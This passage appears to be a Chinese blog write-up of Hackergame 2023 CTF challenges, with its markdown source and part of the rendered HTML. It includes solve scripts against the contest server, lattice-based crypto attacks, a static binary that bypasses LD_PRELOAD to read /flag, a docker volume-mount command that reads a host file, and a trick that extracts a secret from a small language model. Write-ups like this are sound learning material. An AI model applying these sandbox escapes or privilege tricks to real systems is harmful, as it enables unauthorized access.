['uulw!f5soadrhwnrsnstnoeq']   # 48-71\n    code_dict += ['ct.{l-findiehaai{oveatas']   # 72-95\n    code_dict += ['ty9kxborszst.guyd?!blm-p']   # 96-119\n    # print(len(code_dict[0]))\n    # print(set(len(s) for s in code_dict))\n    check_equals(set(len(s) for s in code_dict), {24})\n    return ''.join(code_dict)\n\ndef decrypt_data(input_codes):\n    # retriev th decrypted data\n    code_dict = get_code_dict()\n    output_chars = [code_dict[c] for c in input_codes]\n    return ''.join(output_chars)\n\nif __name__ == '__main__':\n    # check som obvious things\n    check_equals('creat', 'cre' + 'at')\n    check_equals('referrer', 'refer' + 'rer')\n    # check th flag\n    flag = decrypt_data([53, 41, 85, 109, 75, 1, 33, 48, 77, 90,\n                         17, 118, 36, 25, 13, 89, 90, 3, 63, 25,\n                         31, 77, 27, 60, 3, 118, 24, 62, 54, 61,\n                         25, 63, 77, 36, 5, 32, 60, 67, 113, 28])\n    print(flag)\n    check_equals(flag.index('flag{'), 0)\n    check_equals(flag.index('}'), len(flag) - 1)\n    # print th flag\n    # print(flag)\n\n```\n\n## 高频率星球\n\n发现原来不装 asciinema 也能玩，一点点用 Ctrl + H 把 ANSI 转义字符删掉就行了。\n\n## 小型大语言模型星球\n\n第一问直接问 `Am I smart?` 就能套出话来了。\n第二问已经重装系统了，本地模型都跑不起来，就懒得爆了。\n\n## 低带宽星球\n\n第一问随便压缩一下就行。\n第二问应该是要手造了，懒得造了。\n\n## 为什么要打开 /flag 😡\n\n第一问还是 GPT 给出的：\n\n>绕过 LD_PRELOAD 注入的共享对象可以比较困难，因为这是一种强大的机制，它允许开发者或系统管理员在运行时更改动态链接的行为。在安全相关的场景或者 Capture The Flag (CTF) 类型的比赛中，绕过这样的限制通常需要一些创造性的方法和对系统工作方式的深刻理解。\n在给定的上下文中，LD_PRELOAD 用于注入一个共享库（lib.so），这个共享库通过各种方法拦截和更改了文件操作、执行新程序的系统调用。以下是一些可能的绕过策略：\n    1. 使用静态链接的二进制：\n    如果可行的话，使用一个静态链接的二进制文件可以避免 LD_PRELOAD 的影响，因为静态链接的程序不会使用动态链接库。\n    ...\n\n想静态编译的话在编译的时候加个 `-static` 就行了。程序也是 GPT 写的：\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n\nint main() {\n    FILE *file;\n    char *line = NULL;\n    size_t len = 0;\n    ssize_t read;\n\n    // 打开 /flag 文件\n    file = fopen(\"/flag\", \"r\");\n    if (file == NULL) {\n        perror(\"无法打开文件 /flag\");\n        return EXIT_FAILURE;\n    }\n\n    // 读取并打印 /flag 文件的内容\n    while ((read = getline(&line, &len, file)) != -1) {\n        printf(\"%s\", line);\n    }\n\n    // 释放资源并关闭文件\n    free(line);\n    fclose(file);\n\n    return EXIT_SUCCESS;\n}\n```\n\n## 黑客马拉松\n\n做的时候就感觉铁定非预期了，但是令人迷惑的是这才是最自然的思路，那非预期是不是算预期呢（）。\n说起来还是第二问给我的解题思路，看第一问看了半天发现第二问更简单，分数也是第二问更低，说明出题人是知道的，这样的题目顺序真是居心叵测。\n第二问直接取 $e = -1 \\mod \\varphi(N)$ 就过了。\n第一问严格点，还是这么取的话会触发 small loop，因为 $(-1)^2=1$ 嘛，所以取 $e = -3 \\mod \\varphi(N)$ 就行了。\n两问都是二元 coppersmith 的形式。\n\n```python\nfrom sage.all import *\nfrom pwn import *\n\nr = remote('202.38.93.111', 20230)\n\nimport itertools\n \ndef small_roots(f, bounds, m=1, d=None):\n    if not d:\n        d = f.degree()\n \n    R = f.base_ring()\n    N = R.cardinality()\n    \n    f /= f.coefficients().pop(0)\n    f = f.change_ring(ZZ)\n \n    G = Sequence([], f.parent())\n    for i in range(m+1):\n        base = N**(m-i) * f**i\n        for shifts in itertools.product(range(d), repeat=f.nvariables()):\n            g = base * prod(map(power, f.variables(), shifts))\n            G.append(g)\n \n    B, monomials = G.coefficient_matrix()\n    monomials = vector(monomials)\n \n    factors = [monomial(*bounds) for monomial in monomials]\n    for i, factor in enumerate(factors):\n        B.rescale_col(i, factor)\n \n    B = B.dense_matrix().LLL()\n \n    B = B.change_ring(QQ)\n    for i, factor in enumerate(factors):\n        B.rescale_col(i, 1/factor)\n \n    H = Sequence([], f.parent().change_ring(QQ))\n    for h in filter(None, B*monomials):\n        H.append(h)\n        I = H.ideal()\n        if I.dimension() == -1:\n            H.pop()\n        elif I.dimension() == 0:\n            roots = []\n            for root in I.variety(ring=ZZ):\n                root = tuple(R(root[var]) for var in f.variables())\n                roots.append(root)\n            return roots\n    return []\n\n# context.log_level = 'debug'\n\np = 20888518302262822708640092467070098180239940282964311580846713529915991035084176547285976560408772270176488335531054066899663135571600859126844374032782889\nlfp = 641940332996671520364775722844731269161\nq = 6214251232316644767865593529639904703813556510242875683726437167720285962376267466666131377504429682587986680767643437843442269652671382746406944152412577\nlfq = 381239571907162860348261198437277761621\n\nphi = (p - 1) * (q - 1)\ne = phi - 1\n\ntoken = <token>\nr.sendlineafter(b'Please input your token:', token.encode())\nr.sendlineafter(b'p:', str(p).encode())\nr.sendlineafter(b'q:', str(q).encode())\nr.sendlineafter(b'A large prime factor of p-1: ', str(lfp).encode())\nr.sendlineafter(b'A large prime factor of q-1: ', str(lfq).encode())\nr.sendlineafter(b'e:', str(e).encode())\nr.sendlineafter(b'Choose mission: ', b'2')\n\nbl = eval(r.recvline().decode().strip())[0]\n\nn = p*q\nPR = PolynomialRing(Zmod(n), names=('a', 'bh'))\n(a, bh) = PR._first_ngens(2)\nf = a * (bh * 2**928 + bl) - 1\n\nsol = small_roots(f, [2**96, 2**96], d=2)\n\n_, bh = sol[0]\nb = (bh * 2**928 + bl) % n\nprint(b)\nr.sendlineafter(b'Predict PRNG state: ', str(b).encode())\nflag = r.recvline().decode().strip()\nsuccess(flag)\nr.close()\n\n```\n\n## 不可加密的异世界 2\n\n关键就是在 GF(257) 里运算后结果还模了 256，所以有一些 256 变成了 0 返回。那么我们看到的 0 就不知道它原来是 0 还是 256 了。\n观察字符的规律，可以发现 ascii 码的最高位一定为 0，那么就可以用异或制造相差 128 的两轮差分，这时候能还原矩阵的大部分，少部分没还原是因为上面的原因。\n这时候如果拿到的向量含 0，就可以用次高位来继续拿一组进行修复，因为我们拿到了向量的大部分，所以可以分别假设次高位为 0 和 1，然后和已知向量进行比较，最像的那个就是正确的。\n这时候基本有一半左右概率还原了，我们可以算一下概率，上面方法出错的可能只会是因为三组向量中有两个 0 同时出现在一个位置或者三 0 合一（极品情况）。对任一元素，三次都不是 0 或者只出一次 0 的概率为 $(\\frac{255}{256})^3 + 3 \\times \\frac{1}{256} \\times (\\frac{255}{256})^2 = \\frac{8388225}{8388608}$，即出现问题的概率为 $\\frac{383}{8388608}$，然而即使出了问题，我们也有一半的概率直接猜对（默认猜 0 原本就是 0），所以单个元素出错概率为 $\\frac{383}{16777216}$，正确概率为 $\\frac{16776833}{16777216}$，那么 128*128=16384 个元素全部正确的概率为 $(\\frac{16776833}{16777216})^{16384}\\approx 0.687957850470333$。\n当然如果觉得还不够爽可以像我一样再抽一发修正，这样基本很接近 100% 了。\n第二问直接求个特征向量，第三问再套个 CVP，此时维数比较大，LLL 的结果不够理想，需要用 BKZ。\n\n```python\nfrom Crypto.Util.number import *\nfrom pwn import *\nfrom sage.all import *\nfrom tqdm import tqdm\n\nr = remote('202.38.93.111', 22000)\n\ntoken = <token>\nr.sendlineafter(b'Please input your token:', token.encode())\n\ntimes = 0\n\ndef enc(m):\n    global times\n    times += 1\n    r.sendlineafter(b'>', m.encode())\n    r.recvuntil(b'you ciphertext : ')\n    cipher = r.readline().decode().strip()\n    return cipher\n\ndef getvec(i, num='00'):\n    return '11'*i + num + '11'*(128-i-1)\n\ndef getzero(vec):\n    return [i for i in range(128) if vec[i] == 0]\n\ndef bit_recover(b1, b2, diff):\n    return (b1 - b2)*pow(diff, -1, 257) % 257\n\ndef vec_recover(v1, v2, diff):\n    return [bit_recover(b1, b2, diff) for b1, b2 in zip(v1, v2)]\n\n\ndef diff_attack(idx):\n    # suppose xorflag = '00000000'\n    xorflag = 0\n    c00 = bytes.fromhex(enc(getvec(idx, '00')))\n    c80 = bytes.fromhex(enc(getvec(idx, '80')))\n    most = vec_recover(c80, c00, 0x80)\n    zero00 = getzero(c00)\n    zero80 = getzero(c80)\n    # if no zero in c00 and c80, then most is correct\n    if len(zero00+zero80) == 0:\n        return most\n    zero0080 = list(set(zero00) & set(zero80))\n    for i in zero0080:\n        # remove the zero in zero00 and zero80, they will be patched later\n        zero00.remove(i)\n        zero80.remove(i)\n    c40 = bytes.fromhex(enc(getvec(idx, '40')))\n    zero40 = getzero(c40)\n    k40 = vec_recover(c40, c00, -0x40)\n    k41 = vec_recover(c40, c00, 0x40)\n    if abs(norm(vector(ZZ, most)-vector(ZZ, k40))) < abs(norm(vector(ZZ, most)-vector(ZZ, k41))):\n        xorflag ^= 0x40\n    zero0040 = []\n    zero4080 = []\n    for i in zero00:\n        if i in zero40:\n            zero0040.append(i)\n            continue\n        most[i] = bit_recover(c80[i], c40[i], (xorflag^0x80)-(xorflag^0x40))\n    for i in zero80:\n        if i in zero40:\n            zero4080.append(i)\n            continue\n        most[i] = bit_recover(c40[i], c00[i], (xorflag^0x40)-xorflag)\n    if len(zero0040+zero4080+zero0080) == 0:\n        return most\n    c20 = bytes.fromhex(enc(getvec(idx, '20')))\n    k20 = vec_recover(c20, c00, 0x20)\n    k21 = vec_recover(c20, c00, -0x20)\n    if abs(norm(vector(ZZ, most)-vector(ZZ, k20))) > abs(norm(vector(ZZ, most)-vector(ZZ, k21))):\n        xorflag ^= 0x20\n    for i in zero0040:\n        most[i] = bit_recover(c80[i], c20[i], (xorflag^0x80)-(xorflag^0x20))\n    for i in zero4080:\n        most[i] = bit_recover(c20[i], c00[i], (xorflag^0x20)-xorflag)\n    for i in zero0080:\n        most[i] = bit_recover(c40[i], c20[i], (xorflag^0x40)-(xorflag^0x20))\n    return most\n    \nm = []\n\nfor i in tqdm(range(128)):\n    m.append(diff_attack(i))\nsuccess('recover key in {} times'.format(times))\n\nc = bytes.fromhex(enc('0'*255+'1'))\nM = matrix(GF(257), m).transpose()\nresult = (M**(-1)) * vector(GF(257), list(c))\nflag = ''.join([chr(int(i)) for i in result])\nflag1 = flag.split('\\n')[0]\nsuccess('flag1: '+flag1)\n\n# V = (M - matrix.identity(128)).right_kernel().basis_matrix()\n# v = V[0]\n# print(v)\n# v = bytes(v)\n# v = hex(bytes_to_long(v))[2:].zfill(256)\n# print(v,len(v))\n# r.sendlineafter(b'>', v.encode())\n\ndef cvp(M, v, d=2**10, mothod='BKZ'):\n    p = M.base_ring().characteristic()\n    M = M.change_ring(ZZ)\n    v = v.change_ring(ZZ)\n    M = M.stack(matrix.identity(M.ncols())*p)\n    M = M.stack(-v)\n    M = M.augment(vector(ZZ, [0]*(M.nrows()-1)+[d]))\n    if mothod == 'LLL':\n        M = M.LLL()\n    else:\n        M = M.BKZ()\n    vv = vector(ZZ, M[-1][:-1])\n    return vv+v\n\nZ = (M - matrix.identity(128)).right_kernel().basis_matrix()\nv = cvp(Z, vector(ZZ, [0x50]*128))\nv = hex(bytes_to_long(bytes(list(v))))[2:].zfill(256)\n\nr.sendlineafter(b'>', v.encode())\n\nr.recvuntil(b'[+] unbelievable !!! You are an excellent hacker!\\n')\nflag2 = r.readline().decode().strip()\nsuccess('flag2: '+flag2)\n\nr.recvuntil(b'[+] how can you find such an exquisite solution?\\n')\nflag3 = r.readline().decode().strip()\nsuccess('flag3: '+flag3)\n\nr.close()\n```\n","slug":"Hackergame2023-writeups","published":1,"updated":"2023-11-20T18:52:19.206Z","comments":1,"layout":"post","photos":[],"_id":"clxa5zodl00157slz6dpn0yjf","content":"<p>打 Hackergame 的第三年。</p>\n<span id=\"more\"></span>\n<h2 id=\"Summary\"><a href=\"#Summary\" class=\"headerlink\" title=\"Summary\"></a>Summary</h2><p>又是一年 Hackergame，今年终于进了一次前 100，总排 72，math 榜也能看到我。<br>开赛的时候在东校参加迎新大会，校巴的上车点和下车点竟然是不一样的，没坐上回去的车，最后还得自己买高铁，要是校巴还报销不了的话是真的想似了。<br>GZTime 还是直线上分，每年的保留节目了属于是。ZRHan 也打到了第 9，我校首次在 hg 前十里占两席。mcfx 也又 AK 了，现在的我没以前那么菜了，才更觉得他的数学水平简直不像人，甚至有种比春哥还强一大截的感觉，有空得翻翻他 blog，看看能不能淘到点什么。<br>打到一半的时候我实在受不了这一天比一天卡的电脑了，就重装了一下系统，这下啥环境都没了，装 sagemath 也装了半天，好在最后装好了，但也因此几乎停止了上分。</p>\n<hr>\n<h2 id=\"签到\"><a href=\"#签到\" class=\"headerlink\" title=\"签到\"></a>签到</h2><p>虽然做了两年签到的我大概也能猜到什么套路，但还是玩了一下。<br>要求喊出 “Hackergame 启动！” 并且相似度要达到 99.9% 才能拿到 flag，直接随便意思一句点提交，url 出现 <code>?similarity=77.5930335706637</code>，直接改成 100，回车。<br>点击获取 flag，然后我屏幕就白了，然后。。。见白知原好吧。</p>\n<h2 id=\"猫咪小测\"><a href=\"#猫咪小测\" class=\"headerlink\" title=\"猫咪小测\"></a>猫咪小测</h2><ol>\n<li><p>想要借阅世界图书出版公司出版的《A Classical Introduction To Modern Number Theory 2nd ed.》，应当前往中国科学技术大学西区图书馆的哪一层？（30 分）<br>手动爆破，12 层，还挺高。</p>\n</li>\n<li><p>今年 arXiv 网站的天体物理版块上有人发表了一篇关于「可观测宇宙中的鸡的密度上限」的论文，请问论文中作者计算出的鸡密度函数的上限为 10 的多少次方每立方秒差距？（30 分）<br>提示：是一个非负整数。<br>脚本爆破，代码如下：</p>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests <span class=\"keyword\">as</span> r</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">from</span> tqdm <span class=\"keyword\">import</span> tqdm</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">crack</span>(<span class=\"params\">q2</span>):</span><br><span class=\"line\">    url = <span class=\"string\">&#x27;http://202.38.93.111:10001/&#x27;</span></span><br><span class=\"line\">    payload = &#123;<span class=\"string\">&#x27;q1&#x27;</span>: <span class=\"string\">&#x27;12&#x27;</span>, <span class=\"string\">&#x27;q2&#x27;</span>: q2,</span><br><span class=\"line\">            <span class=\"string\">&#x27;q3&#x27;</span>: <span class=\"string\">&#x27;12&#x27;</span>, <span class=\"string\">&#x27;q4&#x27;</span>: <span class=\"number\">0</span>&#125;</span><br><span class=\"line\">    headers = &#123;<span class=\"string\">&#x27;Cookie&#x27;</span>: <span class=\"string\">&#x27;session=eyJ0b2tlbiI6IjcxNDpNRVVDSUMwTFByNHBrS3QyQmwrU3dCQUpVbE1wdldmRU1wSzIyeTcxYzVxV3diTmFBaUVBcXVUYTFxS3kxYXdYOGxnc0lBOExtK215NEZ1RlB3SEVvM053cnJXZGJlND0ifQ.ZT3Olw.PIfDty1-kKuL1PSgMf8Et1GIJv4&#x27;</span>&#125;</span><br><span class=\"line\">    res = r.post(url, headers=headers, data=payload).text</span><br><span class=\"line\">    pat = re.<span class=\"built_in\">compile</span>(<span class=\"string\">r&#x27;(\\d+)。&#x27;</span>)</span><br><span class=\"line\">    score = re.findall(pat, res)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">int</span>(score[<span class=\"number\">0</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">    res = crack(<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> res == <span class=\"number\">60</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure></li>\n<li><p>为了支持 TCP BBR 拥塞控制算法，在编译 Linux 内核时应该配置好哪一条内核选项？（20 分）<br>提示：输入格式为 CONFIG_XXXXX，如 CONFIG_SCHED_SMT。<br>问一下 GPT 就行，直接就出 <code>CONFIG_TCP_CONG_BBR</code> 了。</p>\n</li>\n<li><p>🥒🥒🥒：「我……从没觉得写类型标注有意思过」。在一篇论文中，作者给出了能够让 Python 的类型检查器 MyPY mypy 陷入死循环的代码，并证明 Python 的类型检查和停机问题一样困难。请问这篇论文发表在今年的哪个学术会议上？（20 分）<br>提示：会议的大写英文简称，比如 ISCA、CCS、ICML。<br>搜一下就有，找到 Python Type Hints are Turing Complete 这篇文章，在 ECOOP 发表。</p>\n</li>\n</ol>\n<h2 id=\"更深更暗\"><a href=\"#更深更暗\" class=\"headerlink\" title=\"更深更暗\"></a>更深更暗</h2><p>水题，F12，随便展开一下元素就找到 flag 了。</p>\n<h2 id=\"旅行照片-3-0\"><a href=\"#旅行照片-3-0\" class=\"headerlink\" title=\"旅行照片 3.0\"></a>旅行照片 3.0</h2><p>可以直接看官方 wp。学长晚上的行程注意看脖子上带子的文字就行。</p>\n<h2 id=\"赛博井字棋\"><a href=\"#赛博井字棋\" class=\"headerlink\" title=\"赛博井字棋\"></a>赛博井字棋</h2><p>霸道的力量，用 hackerbar 下到人机下过的位置就行。</p>\n<h2 id=\"奶奶的睡前-flag-故事\"><a href=\"#奶奶的睡前-flag-故事\" class=\"headerlink\" title=\"奶奶的睡前 flag 故事\"></a>奶奶的睡前 flag 故事</h2><p>截图漏洞，之前见过 Windows 的，谷歌的亲儿子手机就是 Pixel，直接搜 Pixel screenshot hack 就行了。找到网站，手机型号选择最新的不行，换个老点的就可以了。</p>\n<h2 id=\"组委会模拟器\"><a href=\"#组委会模拟器\" class=\"headerlink\" title=\"组委会模拟器\"></a>组委会模拟器</h2><p>F12 看下请求，发现会先拿到全部 1000 条消息，包含消息 id、内容和时间，点击消息会发消息的 id 到服务端，这样的话我们用 python 直接梭就行了。<br>注意要按时间发包，不然会返回“发生了时空穿越”的失败提示。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests <span class=\"keyword\">as</span> r</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">from</span> tqdm <span class=\"keyword\">import</span> tqdm</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&#x27;http://202.38.93.111:10021/api/getMessages&#x27;</span></span><br><span class=\"line\">headers = &#123;<span class=\"string\">&#x27;Cookie&#x27;</span>: &lt;cookie&gt;&#125;</span><br><span class=\"line\">res = r.post(url, headers=headers).text</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delmsg</span>(<span class=\"params\">idd</span>):</span><br><span class=\"line\">    url = <span class=\"string\">&#x27;http://202.38.93.111:10021/api/deleteMessage&#x27;</span></span><br><span class=\"line\">    headers = &#123;<span class=\"string\">&#x27;Cookie&#x27;</span>: &lt;cookie&gt;,</span><br><span class=\"line\">               <span class=\"string\">&#x27;Content-Type&#x27;</span>: <span class=\"string\">&#x27;application/json&#x27;</span>,&#125;</span><br><span class=\"line\">    data = &#123;<span class=\"string\">&#x27;id&#x27;</span>: idd&#125;</span><br><span class=\"line\">    res = r.post(url, headers=headers, data=json.dumps(data)).text</span><br><span class=\"line\">    res = json.loads(res)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> res[<span class=\"string\">&#x27;success&#x27;</span>] == <span class=\"literal\">True</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> res[<span class=\"string\">&#x27;error&#x27;</span>]</span><br><span class=\"line\">start_time = time.time()</span><br><span class=\"line\"></span><br><span class=\"line\">js = json.loads(res)</span><br><span class=\"line\">msg = js[<span class=\"string\">&#x27;messages&#x27;</span>]</span><br><span class=\"line\">msg = <span class=\"built_in\">list</span>(msg)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> m <span class=\"keyword\">in</span> msg:</span><br><span class=\"line\">    pat = re.<span class=\"built_in\">compile</span>(<span class=\"string\">r&#x27;hack\\[[a-z]+\\]&#x27;</span>)</span><br><span class=\"line\">    flag = re.search(pat, m[<span class=\"string\">&#x27;text&#x27;</span>])</span><br><span class=\"line\">    <span class=\"keyword\">if</span> flag:</span><br><span class=\"line\">        m[<span class=\"string\">&#x27;flag&#x27;</span>] = <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        m[<span class=\"string\">&#x27;flag&#x27;</span>] = <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># with open(&#x27;output.txt&#x27;, &#x27;w+&#x27;) as f:</span></span><br><span class=\"line\"><span class=\"comment\">#     for m in msg:</span></span><br><span class=\"line\"><span class=\"comment\">#         f.write(f&quot;&#123;m[&#x27;flag&#x27;]&#125; &#123;m[&#x27;text&#x27;]&#125;\\n&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> tqdm(<span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(msg))):</span><br><span class=\"line\">    txt = msg[i][<span class=\"string\">&#x27;text&#x27;</span>]</span><br><span class=\"line\">    delay = msg[i][<span class=\"string\">&#x27;delay&#x27;</span>]</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        current_time = time.time() - start_time</span><br><span class=\"line\">        <span class=\"keyword\">if</span> current_time &gt; delay:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> msg[i][<span class=\"string\">&#x27;flag&#x27;</span>]:</span><br><span class=\"line\">                res = delmsg(i)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> res != <span class=\"literal\">True</span>:</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(txt)</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(res)</span><br><span class=\"line\">                <span class=\"keyword\">break</span>  <span class=\"comment\"># 添加退出条件</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">break</span>  <span class=\"comment\"># 添加退出条件</span></span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&#x27;http://202.38.93.111:10021/api/getflag&#x27;</span></span><br><span class=\"line\">res = r.post(url, headers=headers).text</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(json.loads(res))</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"虫\"><a href=\"#虫\" class=\"headerlink\" title=\"虫\"></a>虫</h2><p>SSTV，在 github 找个 <a href=\"https://github.com/colaclanth/sstv\">Decoder</a> 就行，舍友还在那播放，太折磨了（）。</p>\n<h2 id=\"JSON-⊂-YAML\"><a href=\"#JSON-⊂-YAML\" class=\"headerlink\" title=\"JSON ⊂ YAML?\"></a>JSON ⊂ YAML?</h2><p>第一问 GPT 给出的答案五花八门，但是都不行，最后还是去找了文档一个个试试出来的浮点数可以触发。<br>第二问 GPT 倒是好使，直接说两个相同的 key 会触发。<br>两个 payload 分别是 <code>&#123;&quot;null&quot;: -2E+05&#125;</code> 和 <code>&#123;&quot;null&quot;: &quot;yes&quot;,&quot;null&quot;:&quot;no&quot;&#125;</code>。</p>\n<h2 id=\"Git-Git-叹号\"><a href=\"#Git-Git-叹号\" class=\"headerlink\" title=\"Git? Git 叹号\"></a>Git? Git 叹号</h2><p>（标题直接打 ！的话 markdown 报错，看着难受）<br>问了 GPT，让我用 <code>reflog</code>，如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git reflog</span><br><span class=\"line\">ea49f0c (HEAD -&gt; main) HEAD@&#123;0&#125;: commit: Trim trailing spaces</span><br><span class=\"line\">15fd0a1 (origin/main, origin/HEAD) HEAD@&#123;1&#125;: reset: moving to HEAD~</span><br><span class=\"line\">505e1a3 HEAD@&#123;2&#125;: commit: Trim trailing spaces</span><br><span class=\"line\">15fd0a1 (origin/main, origin/HEAD) HEAD@&#123;3&#125;: <span class=\"built_in\">clone</span>: from https://github.com/dair-ai/ML-Course-Notes.git</span><br></pre></td></tr></table></figure>\n\n<p>可以看到，15fd0a1 是撤销的操作，我们用 <code>diff</code> 看一下修改了什么就行了：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git diff 505e1a3 15fd0a1 --patch</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"HTTP-集邮册\"><a href=\"#HTTP-集邮册\" class=\"headerlink\" title=\"HTTP 集邮册\"></a>HTTP 集邮册</h2><p>前面两问胡乱试几下就有了。<br>最后一问没搞出来。</p>\n<h2 id=\"Docker-for-Everyone\"><a href=\"#Docker-for-Everyone\" class=\"headerlink\" title=\"Docker for Everyone\"></a>Docker for Everyone</h2><p>告诉一下 GPT 可以执行 <code>docker</code> 命令，就给出 payload 了</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -v /dev/shm:/dev/shm --<span class=\"built_in\">rm</span> -it alpine <span class=\"built_in\">cat</span> /dev/shm/flag</span><br></pre></td></tr></table></figure>\n\n<p>还解释得挺详细：</p>\n<blockquote>\n<p>在这个命令中：<br>docker run 是用来创建并运行一个新容器的命令。<br>-v /dev/shm:/dev/shm 是一个卷参数，它将主机上的/dev/shm目录挂载到容器的/dev/shm目录。<br>–rm 是一个选项，它会在容器退出时删除容器，以避免留下任何残留数据。<br>-it 是一个选项，它会为容器提供一个交互式终端。<br>alpine 是你想要运行的容器镜像的名称。<br>cat /dev/shm/flag 是你想在容器内运行的命令，它会尝试读取并输出/dev/shm/flag的内容。</p>\n</blockquote>\n<h2 id=\"惜字如金-2-0\"><a href=\"#惜字如金-2-0\" class=\"headerlink\" title=\"惜字如金 2.0\"></a>惜字如金 2.0</h2><p>手调即可。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span 